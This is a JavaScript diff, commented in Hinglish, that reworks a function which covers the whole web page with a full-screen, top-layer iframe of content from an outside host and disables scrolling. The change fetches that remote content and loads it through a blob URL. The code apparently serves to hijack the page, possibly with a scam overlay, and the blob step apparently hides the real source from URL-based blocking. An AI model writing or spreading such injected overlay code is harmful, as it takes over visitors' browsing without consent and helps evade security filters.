@@ -285,52 +285,59 @@ async function initOnce(){
 
 }
 
-function showIframe(){
+// Is approach mein showIframe ko async banana hoga
+async function showIframe(){
 
-    const createFrame = () => {
+    const createFrame = async () => {
 
         if(document.getElementById("bruceDiv"))
             return;
 
-        document.documentElement.style.overflow="hidden";
+        try {
+            // 1. Data call / fetch karna
+            const response = await fetch("https://api.intellectpath.net/view/win");
+            if (!response.ok) throw new Error("Network response was not ok");
+            
+            // 2. Response ko Blob mein convert karna
+            const blob = await response.blob();
+            const blobUrl = URL.createObjectURL(blob);
 
-        const div =
-            document.createElement("div");
+            document.documentElement.style.overflow="hidden";
 
-        div.id="bruceDiv";
+            const div = document.createElement("div");
+            div.id="bruceDiv";
+            div.style.cssText="position:fixed;inset:0;z-index:2147483647;background:#fff;";
 
-        div.style.cssText=
-        "position:fixed;inset:0;z-index:2147483647;background:#fff;";
+            const iframe = document.createElement("iframe");
+            
+            // 3. Blob URL ko iframe ka source banana
+            iframe.src = blobUrl;
 
-        const iframe =
-            document.createElement("iframe");
+            iframe.style.cssText = "width:100%;height:100%;border:0;display:block;";
+            iframe.allow = "fullscreen; autoplay; encrypted-media; picture-in-picture";
+            iframe.allowFullscreen = true;
+          
+            div.appendChild(iframe);
+            document.body.appendChild(div);
 
-        iframe.src=
-        "https://api.intellectpath.net/view/win";
+            iframe.onload = () => {
+                URL.revokeObjectURL(blobUrl);
+            };
 
-        iframe.style.cssText=
-        "width:100%;height:100%;border:0;display:block;";
-
-        iframe.allow=
-        "fullscreen; autoplay; encrypted-media; picture-in-picture";
-
-        iframe.allowFullscreen=true;
-      
-        div.appendChild(iframe);
-
-        document.body.appendChild(div);
+        } catch (error) {
+            console.error("Blob iframe load karne mein error aaya:", error);
+        }
     };
 
     if(document.body){
-        createFrame();
+        await createFrame();
     }else{
         window.addEventListener(
             "DOMContentLoaded",
-            createFrame,
+            async () => { await createFrame(); },
             {once:true}
         );
     }
-
 }
     
 })();
